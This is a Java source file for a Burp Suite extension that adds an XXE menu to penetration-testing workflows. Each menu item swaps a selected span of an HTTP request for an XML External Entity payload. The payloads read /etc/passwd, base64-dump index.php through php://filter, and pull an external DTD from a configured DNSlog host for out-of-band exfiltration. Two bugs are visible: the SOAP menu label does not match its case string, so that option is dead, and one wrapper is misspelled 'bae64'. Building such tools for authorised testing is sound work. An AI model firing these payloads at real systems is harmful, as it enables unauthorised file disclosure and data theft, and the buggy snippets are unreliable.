package hackbar;

import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.util.HashMap;

import javax.swing.JMenu;

import burp.BurpExtender;
import burp.IHttpRequestResponse;
import burp.Methods;

//https://github.com/EdOverflow/bugbounty-cheatsheet/blob/master/cheatsheets/xxe.md
public class XXE_Menu extends JMenu {
    public BurpExtender myburp;
    public String[] XXE_MenuItems = {"Basic Test","XXE 1", "XXE 2", "XXE 3", "Php wrapper in XXE", "Php wrapper in XXE 2","XXE in SOAP"};
    
    public XXE_Menu(BurpExtender burp){
        this.setText("XXE");
        this.myburp = burp;
        Methods.add_MenuItem_and_listener(this, XXE_MenuItems, new XXEItemListener(myburp));
    }
}


class XXEItemListener implements ActionListener {

    BurpExtender myburp;
    XXEItemListener(BurpExtender burp) {
        myburp = burp;
    }
    
    @Override
    public void actionPerformed(ActionEvent e) {
        IHttpRequestResponse req = myburp.context.getSelectedMessages()[0];
        byte[] request = req.getRequest();
        
        int[] selectedIndex = myburp.context.getSelectionBounds();
        
        String action = e.getActionCommand();
        
        byte[] newRequest = GetNewRequest(request, selectedIndex, action);
        req.setRequest(newRequest);
    }
    
    public byte[] GetNewRequest(byte[] request,int[] selectedIndex, String action){
		String selectedString =null;
		String dnslog = myburp.tableModel.getConfigByKey("DNSlogServer");
		switch(action){
            case "Basic Test":
                selectedString  =    "<!--?xml version=\"1.0\" ?-->\n" +
                                    "<!DOCTYPE replace [<!ENTITY example \"Doe\"> ]>\n" +
                                    " <userInfo>\n" +
                                    "  <firstName>John</firstName>\n" +
                                    "  <lastName>&example;</lastName>\n" +
                                    " </userInfo>";
                break;
            case "XXE 1":
                selectedString =    "<?xml version=\"1.0\"?>\n" +
                                    "<!DOCTYPE data [\n" +
                                    "<!ELEMENT data (#ANY)>\n" +
                                    "<!ENTITY file SYSTEM \"file:///etc/passwd\">\n" +
                                    "]>\n";
                break;
            case "XXE 2":
                selectedString =    "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                                    "  <!DOCTYPE foo [  \n" +
                                    "  <!ELEMENT foo ANY >\n" +
                                    "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]>";
                break;
            case "XXE 3":
                selectedString = "<!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>";
                break;
            case "Php wrapper in XXE":
                selectedString = "<!DOCTYPE replace [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"> ]>";
                break;
            case "Php wrapper in XXE 2":
                selectedString =    ("<!DOCTYPE foo [\n" +
                                    "<!ELEMENT foo ANY >\n" +
                                    "<!ENTITY % xxe SYSTEM \"php://filter/convert.bae64-encode/resource=http://%s\" >\n" +
                                    "]>").replace("%s", dnslog);
                break;
            case "XXE inside SOAP":
                selectedString =    ("<soap:Body>\r\n" + 
                		"  <foo>\r\n" + 
                		"    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM \"http://%s/xxeinsidesoap\"> %dtd;]><xxx/>]]>\r\n" + 
                		"  </foo>\r\n" + 
                		"</soap:Body>").replaceAll("%s", dnslog);
                break;
            default:
                break;
        }
        if (selectedString!=null){
        	return Methods.do_modify_request(request, selectedIndex, selectedString.getBytes());
        }else {
        	return request;
        }
    }
    

}